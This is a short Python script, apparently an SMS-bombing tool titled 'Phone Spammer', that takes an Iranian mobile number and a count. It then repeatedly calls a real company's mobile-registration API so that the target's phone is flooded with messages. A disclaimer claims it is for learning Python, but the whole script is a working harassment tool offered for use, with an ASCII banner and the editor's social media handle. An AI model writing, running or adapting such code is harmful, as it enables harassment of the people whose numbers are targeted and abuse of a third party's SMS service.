import requests,random,json, colorama 
from colorama import Fore

a = """


 _______  _______  _______  _______  _______  _______  _______ 
 (  ____ \(  ____ )(  ___  )(       )(       )(  ____ \(  ____ )
 | (    \/| (    )|| (   ) || () () || () () || (    \/| (    )|
 | (_____ | (____)|| (___) || || || || || || || (__    | (____)|
 (_____  )|  _____)|  ___  || |(_)| || |(_)| ||  __)   |     __)
       ) || (      | (   ) || |   | || |   | || (      | (\ (   
 /\____) || )      | )   ( || )   ( || )   ( || (____/\| ) \ \__
 \_______)|/       |/     \||/     \||/     \|(_______/|/   \__/
                                                                
  PHONE SPAMMER BY ANAS V2
  Edited BY @h@SsEiN
  
Please follow me in instagram :
    
👉 hossein.1171991
  
  
  
  
  
"""
print (Fore.GREEN + a)


print (Fore.RED + " Warning !!! this script just created for learning python3!!!")



print (Fore.YELLOW + " before use please install modules requests , colorama ,...")



b = input(Fore.GREEN + "[*] Phone Number: 09")
c = input("[*] Number of Spam: ")
d = int(b)
e = int(c)
for f in range(e):
    s = requests.post(url="https://isacoapp.isaco.ir/api/Account/RegisterMobileNumber?mobileNumber=09%s"%b, headers={'Content-Type':'application/json'})
    if s.status_code == 200:
    	 print(Fore.GREEN + " [+]  Sended PM  " ) 
    else :
     print(Fore.RED + " [+] failure! please check your conection Internet and try again")
